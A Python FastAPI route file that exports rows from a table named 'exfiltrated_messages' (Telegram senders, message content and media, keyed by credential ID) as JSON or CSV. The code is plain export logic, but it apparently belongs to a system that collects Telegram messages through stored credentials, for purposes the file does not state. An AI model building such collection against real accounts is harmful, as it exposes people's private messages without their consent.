"""Monitor exports resource routes."""

from .common import *

router = APIRouter()

@router.get("/export")
async def export_messages(
    credential_id: UUID | None = Query(None),
    format: Literal["json", "csv"] = Query("json"),
    since: datetime | None = Query(None),
    limit: int = Query(1000, ge=1, le=10000),
):
    """Export exfiltrated messages as JSON or CSV. Filters: credential_id, since, limit."""
    q = (
        db.table("exfiltrated_messages")
        .select("id,credential_id,telegram_msg_id,sender_name,content,media_type,is_broadcasted,created_at")
        .order("created_at", desc=False)
        .limit(min(limit, 10000))
    )
    if credential_id:
        q = q.eq("credential_id", str(credential_id))
    if since:
        q = q.gte("created_at", since.isoformat())

    result = await execute_async(q)
    rows = result.data or []

    if format == "csv":
        fieldnames = ["id", "credential_id", "telegram_msg_id", "sender_name",
                      "content", "media_type", "is_broadcasted", "created_at"]
        buf = io.StringIO()
        writer = csv.DictWriter(buf, fieldnames=fieldnames, extrasaction="ignore")
        writer.writeheader()
        for row in rows:
            # Replace None with empty string for CSV safety
            writer.writerow({k: ("" if row.get(k) is None else row.get(k)) for k in fieldnames})
        ts = datetime.now(UTC).strftime("%Y%m%dT%H%M%S")
        buf.seek(0)
        return StreamingResponse(
            iter([buf.getvalue()]),
            media_type="text/csv",
            headers={"Content-Disposition": f"attachment; filename=messages-{ts}.csv"},
        )

    ts = datetime.now(UTC).strftime("%Y%m%dT%H%M%S")
    return JSONResponse(
        content=rows,
        headers={"Content-Disposition": f"attachment; filename=messages-{ts}.json"},
    )
